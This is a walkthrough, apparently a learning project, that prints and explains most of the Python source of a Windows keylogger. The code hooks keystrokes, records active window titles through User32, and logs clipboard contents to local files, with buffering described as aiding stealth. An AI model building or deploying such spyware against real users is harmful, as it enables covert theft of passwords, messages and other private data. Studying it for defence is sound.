# Advanced Keylogger: Code Analysis & Walkthrough

This document provides a technical deep-dive into the `keylogger.py` implementation. It outlines the system architecture, Windows API integration, and the memory buffering logic used to monitor input efficiently.

## Core Concepts
To implement this tool effectively, four key technical concepts were utilized:

1.  **Input Hooking (`pynput`)**: A method to intercept "events" (like key presses) from the Operating System before they reach the active application.
2.  **Windows API Access (`ctypes`)**: Using Python to talk directly to low-level Windows system files (`User32.dll`) to identify which window is open.
3.  **Clipboard Forensics (`pyperclip`)**: A mechanism to monitor the system clipboard memory to detect and log copied text (Data-in-Transit).
4.  **Memory Buffering**: Storing data temporarily in RAM (Random Access Memory) and only writing to the hard drive occasionally to improve speed and stealth.

---


## Logic Breakdown

### Part 1: Imports (The Tools)
We start by bringing in the necessary libraries to talk to the Operating System.

```python
from pynput import keyboard
import time
import ctypes
import pyperclip
import os
```
from pynput import keyboard: The core library. It hooks into the OS to listen for keystrokes in the background.

import time: Used to generate timestamps for filenames (e.g., 16-12-2025), ensuring logs don't overwrite each other.

import ctypes: A bridge to the Windows API (User32.dll). It allows Python to ask low-level questions like "Which window is active?".

import pyperclip: A library specifically for accessing the system clipboard (Copy/Paste history).

import os: Handles file system operations, specifically for creating the storage directory.

Part 2: Configuration & Folder Setup
Here we ensure the logs are organized neatly rather than cluttering the directory.

Python

log_folder = "Keystroke_Logs"

if not os.path.exists(log_folder):
    os.makedirs(log_folder)

timestamp = time.strftime("%d-%m-%Y_%H-%M-%S")
log_file = f"{log_folder}/keylog_{timestamp}.txt"

BUFFER_SIZE = 20
log_folder: Defines the name of the directory where logs will be stored.

os.makedirs: Checks if the folder exists. If not, it creates it automatically.

timestamp: Generates a string representing the exact start time (Day-Month-Year_Hour-Minute-Second).

log_file: Combines the folder path and timestamp to create a unique file path for this specific session.

BUFFER_SIZE = 20: Sets the memory limit. The script will hold 20 keys in RAM before writing to the hard drive.

Part 3: Global Variables (The "Memory")
These variables track the state of the computer across different events.

Python

key_buffer = []       
last_window = None    
last_clipboard = ""
key_buffer: A list used as a temporary holding area (RAM) for keystrokes before they are saved.

last_window: specific variable to remember the previous active window title. Used to detect when the user switches applications.

last_clipboard: Stores the last known text copied by the user. Used to detect if new text has been copied.

Part 4: Helper Function - Window Tracking
This function retrieves context for the keystrokes by querying the Windows API.

Python

def get_active_window():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buffer = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value
GetForegroundWindow: Identifies the "Handle" (ID) of the window the user is currently looking at.

create_unicode_buffer: Allocates a specific amount of memory to hold the window's title text.

GetWindowTextW: Copies the actual title text (e.g., "Inbox - Gmail") from the window into our memory buffer.

return buffer.value: Converts the memory buffer into a readable Python string.

Part 5: Helper Function - Saving Data (The Flush)
This manages the transfer of data from RAM (Buffer) to the Hard Drive (File).

Python

def flush_buffer():
    global key_buffer
    if len(key_buffer) == 0:
        return 

    with open(log_file, "a", encoding="utf-8") as f:
        f.write("".join(key_buffer))
    
    key_buffer = []
global key_buffer: Allows the function to modify the main list defined at the top of the script.

if len == 0: Efficiency check. If the buffer is empty, it stops immediately to save processing power.

open(..., "a"): Opens the file in "Append Mode", ensuring new data is added to the end without deleting old data.

"".join(key_buffer): Efficiently merges the list of characters (e.g., ['h','i']) into a single string ("hi").

key_buffer = []: Clears the memory after saving, making space for new keys.

Part 6: Helper Function - The Spy (Clipboard)
This detects "Copy" events by monitoring the system clipboard.

Python

def check_clipboard():
    global last_clipboard, key_buffer
    
    try:
        current_clipboard = pyperclip.paste()
    except:
        return 
pyperclip.paste(): Retrieves the current text content of the system clipboard.

try/except: A safety block. If the clipboard contains non-text data (like an image), the script ignores it to prevent crashing.

Python

    if current_clipboard != last_clipboard:
        flush_buffer()
        # ... writing to file ...
        last_clipboard = current_clipboard
Change Detection: Compares the current clipboard text with the last_clipboard variable. If they differ, a "Copy" event occurred.

flush_buffer(): Forces a save of current keystrokes before logging the clipboard. This ensures the log timeline remains accurate.

Update State: Updates last_clipboard to the new text so it doesn't get logged again until it changes.

Part 7: The Main Engine - on_press
This function is the event handler that runs every time a key is pressed.

Python

def on_press(key):
    # 1. Check Clipboard 
    check_clipboard()

    # 2. Check Window Change
    current_window = get_active_window()
    if current_window != last_window:
        flush_buffer()
        last_window = current_window
        # ... log window title ...
Sequence of Operations: On every keypress, the script first checks if the Clipboard changed, then checks if the Window changed.

Context Logging: If the window changed, it flushes the buffer and logs the new window title (e.g., [WINDOW: Chrome]) to provide context.

Python

    # 3. Process the Key
    try:
        logging_data = str(key.char)
    except AttributeError:
        # Handle special keys (Space, Enter, etc.)
Character Handling: Tries to convert the input to a character.

Exception Handling: If the key is "special" (like Shift or Ctrl), it catches the error and formats it specifically (e.g., [BSP] for Backspace).

Python

    # 5. Check Buffer Size
    if len(key_buffer) >= BUFFER_SIZE:
        flush_buffer()
Buffer Limit: Checks if the collected keys have reached the BUFFER_SIZE (20). If so, it triggers a save to the hard drive.

Part 8: The Exit & Start
The final cleanup and execution loop.

Python

def on_release(key):
    if key == keyboard.Key.esc:
        flush_buffer()
        return False

with keyboard.Listener(...) as listener:
    listener.join()
on_release: Detects when a key is lifted.

Key.esc: Defines the "Kill Switch". Pressing Esc triggers the exit sequence.

flush_buffer(): Safety save. Ensures any remaining keys in RAM are written to the file before the script closes.

listener.join(): Keeps the script running in the background, listening for events indefinitely until return False is called.